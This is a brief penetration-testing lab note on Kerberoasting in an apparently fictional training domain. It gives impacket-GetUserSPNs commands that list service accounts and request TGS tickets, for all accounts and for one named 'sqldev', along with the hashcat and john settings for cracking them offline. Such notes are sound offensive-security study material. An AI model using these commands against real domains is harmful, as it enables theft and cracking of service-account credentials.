

## Listing SPN Accounts with GetUserSPNs.py

```ruby
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```


We can now pull all TGS tickets for offline processing using the `-request` flag.

```ruby
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```

We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the `sqldev` account.

```ruby
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

the hashcat mode for this hash is `13100`
the john format for this hash is `--format=krb5tgs`






